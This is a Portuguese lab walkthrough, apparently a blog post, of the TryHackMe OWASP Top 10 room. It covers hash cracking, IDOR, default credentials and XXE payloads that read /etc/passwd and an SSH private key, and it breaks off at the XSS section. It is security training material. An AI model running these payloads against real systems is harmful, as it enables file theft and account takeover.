+<p>No exemplo da tarefa, é mostrado o acesso a um <code>flat file database</code> usando SQLite 3. Nele, são verificadas as informações da tabela (<code>PRAGMA table_info(customers);</code>) e feito o dump das informações (<code>SELECT * FROM customers;</code>).</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-EXPOSURE-INFORMATION-1.webp" alt="exposicao dados"  loading="lazy" /></p>
+<p><strong>Read and understand the supporting material on SQLite Databases.</strong><br>
+Resposta: não é necessário responder.</p>
+<h3 data-hextra-search-id="quebra-de-hash">Quebra de hash<span class="hx:absolute hx:-mt-20" id="quebra-de-hash"></span>
+    <a href="#quebra-de-hash" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>No exemplo anterior, conseguimos obter as hashes dos usuários. Como mencionado na tarefa, não utilizaremos as ferramentas disponíveis no Kali. Em vez disso, usaremos uma ferramenta online disponível chamada <a
+    href="https://crackstation.net/"target="_blank" rel="noopener">Crackstation</a>. O escopo da tarefa não inclui descobrir qual é o algoritmo de hash utilizado, pois já foi informado que é (md5) e, além disso, já sabemos que as hashes são facilmente quebradas.</p>
+<p>A hash do usuário <code>Joy Paulson</code> será utilizada:
+<code>5f4dcc3b5aa765d61d8327deb882cf99</code></p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-CRACKSTATION-1.webp" alt="crackstation"  loading="lazy" /></p>
+<p>Com isso, a senha do usuário é descoberta. Como mencionado na tarefa, a ferramenta utiliza uma vasta lista de senhas. Caso a senha da hash não seja descoberta, possivelmente essa hash foi criada para não ser quebrada.</p>
+<p><strong>Read the supporting material about cracking hashes.</strong><br>
+Resposta: não é necessário responder.</p>
+<h4 data-hextra-search-id="desafio">Desafio<span class="hx:absolute hx:-mt-20" id="desafio"></span>
+    <a href="#desafio" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p><strong>Have a look around the webapp. The developer has left themselves a note indicating that there is sensitive data in a specific directory.</strong><br>
+<strong>What is the name of the mentioned directory?</strong></p>
+<p>A página inicial da aplicação não possui informações importantes para nós, conforme mostra a imagem.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-CHALLENGES-1.webp" alt="pagina inicial"  loading="lazy" /></p>
+<p>Na página de login não temos muitas informações, analisando o código fonte temos os caminhos para os <code>.css</code>:</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>href=&#34;../assets/css/style.css
+</span></span><span style="display:flex;"><span>href=&#34;../assets/css/loginStyle.css
+</span></span><span style="display:flex;"><span>href=&#34;../assets/css/orkney.css
+</span></span><span style="display:flex;"><span>href=&#34;../assets/css/icons.css</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Conseguimos realizar listagem de diretório e dentro do diretório <code>assets</code> temos um arquivo sensível: <code>webapp.db</code>.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-CHALLENGES-1-1.webp" alt="webapp.db"  loading="lazy" /></p>
+<p>Resposta:<code>/assets</code></p>
+<p><strong>Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?</strong><br>
+Reposta:<code>webapp.db</code></p>
+<p><strong>Use the supporting material to access the sensitive data. What is the password hash of the admin user?</strong></p>
+<p>Primeiro, devemos realizar o download do arquivo para nossa máquina local. Após isso, verificamos que se trata de um arquivo de banco de dados. Acessamos os dados contidos no arquivo e realizamos o dump das informações sensíveis.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-CHALLENGES-3.webp" alt="dump"  loading="lazy" /></p>
+<p>Resposta:<code>6eea9b7ef19179a06954edd0f6c05ceb</code></p>
+<p><strong>Crack the hash.</strong><br>
+<strong>What is the admin&rsquo;s plaintext password?</strong><br>
+Resposta:<code>qwertyuiop</code></p>
+<p><strong>Login as the admin. What is the flag?</strong><br>
+Resposta: <code>THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}</code></p>
+<h2 data-hextra-search-id="xxe">XXE<span class="hx:absolute hx:-mt-20" id="xxe"></span>
+    <a href="#xxe" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Entidade externa de XML ou XXE é uma vulnerabilidade que se aproveita do processamento de dados de XML em sistemas e aplicativos. O parser do XML processa uma referência a uma entidade externa, que pode ser um recurso do servidor (local) ou um recurso externo.</p>
+<p>Existem dois tipos de XXE:</p>
+<ol>
+<li>
+<p>XXE que é mostrado imediatamente: a resposta do payload do XXE é exibida de imediato.</p>
+</li>
+<li>
+<p>XXE às cegas: não há uma resposta imediata da aplicação e o atacante tem que refletir a saída do payload em um arquivo.</p>
+</li>
+</ol>
+<p><strong>Deploy the machine attached to the task.</strong><br>
+Resposta: não é necessário responder.</p>
+<h3 data-hextra-search-id="entidade-externa-xml-extensible-markup-language">Entidade externa XML (eXtensible Markup Language)<span class="hx:absolute hx:-mt-20" id="entidade-externa-xml-extensible-markup-language"></span>
+    <a href="#entidade-externa-xml-extensible-markup-language" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>XML é uma linguagem de marcação, lida por humanos e máquinas, é utilizada para transporta e armazenar dados.</p>
+<h4 data-hextra-search-id="porque-usar-xml-">Porque usar XML ?<span class="hx:absolute hx:-mt-20" id="porque-usar-xml-"></span>
+    <a href="#porque-usar-xml-" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>XML é independente de plataforma e também uma linguagem de programação independente, garantindo assim suporte caso haja uma mudança de tecnologia ao longo do tempo. Além disso, os dados transportados usando XML podem sofrer alterações a qualquer momento sem afetar a apresentação dos dados. XML permite a validação utilizando <em>Document Type Definition (DTD)</em> e <em>Schema</em>, tornando-o assim livre de erros de sintaxe.</p>
+<h4 data-hextra-search-id="sintaxe">Sintaxe<span class="hx:absolute hx:-mt-20" id="sintaxe"></span>
+    <a href="#sintaxe" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Documentos XML iniciam com a linha abaixo (<code>XML prolog</code>), além disso é uma boa prática utiliza-lo.</p>
+<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></p>
+<p>Todo documento XML possui o elemento &ldquo;ROOT&rdquo; e seus filhos dentro desse documento.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-XML.webp" alt="xml"  loading="lazy" /></p>
+<p>Todos os elementos: <code>&lt;to&gt;, &lt;from&gt;, &lt;subject&gt; e &lt;text&gt;</code> são filhos do elemento &ldquo;ROOT&rdquo; <code>&lt;mail&gt;</code>.</p>
+<p>Assim como no HTML podemos inserir atributos também.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>`<span style="color:#f92672">&lt;text</span> <span style="color:#a6e22e">category =</span> <span style="color:#e6db74">&#34;message&#34;</span><span style="color:#f92672">&gt;</span>You need to learn about XXE<span style="color:#f92672">&lt;/text&gt;</span>`</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h5 data-hextra-search-id="perguntas-1">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-1"></span>
+    <a href="#perguntas-1" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h5><p><strong>Full form of XML</strong><br>
+Resposta:<code>eXtensible Markup Language</code></p>
+<p><strong>Is it compulsory to have XML prolog in XML documents?</strong><br>
+Resposta:<code>no</code></p>
+<p><strong>Can we validate XML documents against a schema?</strong><br>
+Resposta:<code>yes</code></p>
+<p><strong>How can we specify XML version and encoding in XML document?</strong><br>
+Resposta:<code>XML prolog</code></p>
+<h3 data-hextra-search-id="dtd-document-type-definition">DTD (Document Type Definition)<span class="hx:absolute hx:-mt-20" id="dtd-document-type-definition"></span>
+    <a href="#dtd-document-type-definition" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>DTD é o padrão para definição de tipo de documento. Através dele, definimos a estrutura, elementos e atributos de um documento XML.</p>
+<p>Exemplo de DTD, arquivo <code>note.dtd</code>:</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE note [ 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &lt;!ELEMENT note (to,from,heading,body)&gt;</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!ELEMENT to (#PCDATA)&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!ELEMENT from (#PCDATA)&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!ELEMENT heading (#PCDATA)&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!ELEMENT body (#PCDATA)&gt;</span> 
+</span></span><span style="display:flex;"><span>    ]&gt;</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Após criar o DTD, podemos utilizá-lo para validar nosso documento XML, que deve estar em conformidade com as regras do DTD.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE note SYSTEM &#34;note.dtd&#34;&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;note&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;to&gt;</span>falcon<span style="color:#f92672">&lt;/to&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;from&gt;</span>feast<span style="color:#f92672">&lt;/from&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;heading&gt;</span>hacking<span style="color:#f92672">&lt;/heading&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;body&gt;</span>XXE attack<span style="color:#f92672">&lt;/body&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/note&gt;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Basicamente, na parte do DTD, está sendo definida uma note com quatro elementos: to, from, heading e body. Cada um desses elementos contém dados de texto (#PCDATA).</p>
+<p><code>!DOCTYPE</code>: define o elemento root do documento como sendo <code>note</code>.</p>
+<h4 data-hextra-search-id="perguntas-2">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-2"></span>
+    <a href="#perguntas-2" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p><strong>How do you define a new ELEMENT?</strong><br>
+Resposta: <code>!ELEMENT</code></p>
+<p><strong>How do you define a ROOT element?</strong><br>
+Resposta: <code>!DOCTYPE</code></p>
+<p><strong>How do you define a new ENTITY?</strong><br>
+Resposta:<code>!ENTITY</code></p>
+<h3 data-hextra-search-id="xxe---payload">XXE - Payload<span class="hx:absolute hx:-mt-20" id="xxe---payload"></span>
+    <a href="#xxe---payload" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Exemplo de um código utilizando <code>!ENTITY</code> na definição do documento.
+Está sendo definido a entidade com o nome de <code>name</code>e atribuindo o valor <code>feast</code>.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY name &#34;feast&#34;&gt;</span> ]&gt;  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;userInfo&gt;</span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;firstName&gt;</span>falcon<span style="color:#f92672">&lt;/firstName&gt;</span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;lastName&gt;</span>&amp;name;<span style="color:#f92672">&lt;/lastName&gt;</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;/userInfo&gt;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Um exemplo de XXE, usando <code>!ENTITY</code> para ler arquivos no servidor, com a diferença que nosso valor será <code>SYSTEM</code> e o caminho do arquivo (<code>/etc/passwd</code>).</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM &#39;file:///etc/passwd&#39;&gt;</span>]&gt;  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;</span>&amp;read;<span style="color:#f92672">&lt;/root&gt;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h4 data-hextra-search-id="perguntas-3">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-3"></span>
+    <a href="#perguntas-3" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p><strong>Try the payload mentioned in description on the website.</strong><br>
+Resposta: não é necessário responder.</p>
+<h3 data-hextra-search-id="explorando">Explorando<span class="hx:absolute hx:-mt-20" id="explorando"></span>
+    <a href="#explorando" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>No exemplo da aula é fornecido um website com um campo para entrada de dados.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-XXE.webp" alt="xxe"  loading="lazy" /></p>
+<p>Enviamos nossa requisição para Burp.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-XXE-payload.webp" alt="xxe payload"  loading="lazy" /></p>
+<p>No parâmetro <code>xxe</code>vamos enviar nosso payload encodado, utilizando o exemplo anterior.</p>
+<p>Payload:</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>%3C%3Fxml%20version%3D%221.0%22%3F%3E%20%20%0A%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20read%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%5D%3E%20%20%0A%3Croot%3E%26read%3B%3C%2Froot%3E</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-payload-encodado.webp" alt="payload encodado"  loading="lazy" /></p>
+<p>Obtemos sucesso, o host é vulnerável a XXE.</p>
+<h4 data-hextra-search-id="perguntas-4">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-4"></span>
+    <a href="#perguntas-4" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p><strong>Try to display your own name using any payload.</strong><br>
+Resposta: não é necessário responder.</p>
+<p><strong>See if you can read the /etc/passwd</strong><br>
+Resposta: não é necessário responder.</p>
+<p><strong>What is the name of the user in /etc/passwd</strong><br>
+Resposta: <code>falcon</code></p>
+<p><strong>Where is falcon&rsquo;s SSH key located?</strong><br>
+Resposta: <code>/home/falcon/.ssh/id_rsa</code></p>
+<p><strong>What are the first 18 characters for falcon&rsquo;s private key</strong><br>
+Vamos alterar nosso payload para <code>file:///home/falcon/.ssh/id_rsa</code><br>
+Em um editor de texto qualquer contamos a quantidade de caracteres.<br>
+Resposta:<code>MIIEogIBAAKCAQEA7</code></p>
+<h2 data-hextra-search-id="controle-de-acesso-quebrado">Controle de acesso quebrado<span class="hx:absolute hx:-mt-20" id="controle-de-acesso-quebrado"></span>
+    <a href="#controle-de-acesso-quebrado" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Existem páginas que não devem ser acessadas por usuários comuns, como por exemplo, a área administrativa. Se um usuário comum conseguir acesso a esse conteúdo, ele pode visualizar dados sensíveis e realizar funções administrativas para as quais não foi autorizado.</p>
+<p>Alguns cenários são demonstrados:</p>
+<p>Um atacante simplesmente altera o número do parâmetro para qualquer outro e, assim, obtém acesso a outra conta.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>pstmt.setString(<span style="color:#ae81ff">1</span>, request.getParameter(<span style="color:#e6db74">&#34;acct&#34;</span>));
+</span></span><span style="display:flex;"><span>ResultSet results <span style="color:#f92672">=</span> pstmt.executeQuery( );</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>No segundo cenário o atacante alterar o endereço, forçando páginas que possivelmente existem.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>http://example.com/app/getappInfo
+</span></span><span style="display:flex;"><span>http://example.com/app/admin_getappInfo</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h3 data-hextra-search-id="idor">IDOR<span class="hx:absolute hx:-mt-20" id="idor"></span>
+    <a href="#idor" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>IDOR (Insecure Direct Object Reference) é a forma de explorar falhas de configuração através do input do usuário, permitindo acessar objetos que, em teoria, o usuário não poderia acessar.</p>
+<h4 data-hextra-search-id="perguntas-5">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-5"></span>
+    <a href="#perguntas-5" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p><strong>Read and understand how IDOR works.</strong><br>
+Resposta: não é necessário.</p>
+<p><strong>Deploy the machine and go to http://machine_ip/ - Login with the username being noot and the password test1234.</strong><br>
+Resposta:  Não é necessário responder</p>
+<p><strong>Look at other users notes. What is the flag?</strong><br>
+Usando no parâmetro o valor <code>0</code> acessamos uma nota que não é nossa.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-parametro.webp" alt="notes"  loading="lazy" /></p>
+<p>Resposta:<code>flag{fivefourthree}</code></p>
+<h2 data-hextra-search-id="configuração-de-segurança-incorreta">Configuração de segurança incorreta<span class="hx:absolute hx:-mt-20" id="configuração-de-segurança-incorreta"></span>
+    <a href="#configura%c3%a7%c3%a3o-de-seguran%c3%a7a-incorreta" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Isso ocorre quando o responsável pela aplicação acredita que realizou uma configuração adequada, mas na verdade não fez.</p>
+<ul>
+<li>
+<p>Serviços de cloud mal configurados, ex: S3 buckets.</p>
+</li>
+<li>
+<p>Serviços, páginas ou contas desnecessários, ativados.</p>
+</li>
+<li>
+<p>Contas padrão com senhas inalteradas (senhas padrão).</p>
+</li>
+<li>
+<p>Detalhamento excessivo em mensagens de erro.</p>
+</li>
+<li>
+<p>Não uso de cabeçalhos de segurança no HTTP ou revelação de muitos detalhes nos cabeçalhos do HTTP.</p>
+</li>
+</ul>
+<h3 data-hextra-search-id="perguntas-6">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-6"></span>
+    <a href="#perguntas-6" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p><strong>Deploy the VM</strong><br>
+Resposta: não é necessário responder.</p>
+<p><strong>Hack into the webapp, and find the flag!</strong></p>
+<p>Procurando pela documentação da aplicação na internet: <code>Pensive notes</code><br>
+Encontramos as credenciais padrão para acessá-lo: <code>pensive:PensiveNotes</code></p>
+<p>Resposta: <code>thm{4b9513968fd564a87b28aa1f9d672e17}</code></p>
+<h2 data-hextra-search-id="cross-site-scripting">Cross-site Scripting<span class="hx:absolute hx:-mt-20" id="cross-site-scripting"></span>
+    <a href="#cross-site-scripting" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Também conhecido como XSS, é uma vulnerabilidade comum em aplicações web. Trata-se de um tipo de injeção de código malicioso.</p>
+<p>XSS é possível em JavaScript, VBScript, Flash e CSS. Existem três principais tipos de cross-site scripting:</p>
+<ul>
+<li>
+<p><strong>Stored XSS:</strong> O mais perigoso, onde uma string maliciosa se origina do banco de dados do site. Isso acontece porque o site não verifica os inputs enviados.</p>
+</li>
+<li>
+<p><strong>Reflected XSS:</strong> O site inclui o payload na requisição que será enviada para o usuário.</p>
+</li>
+<li>
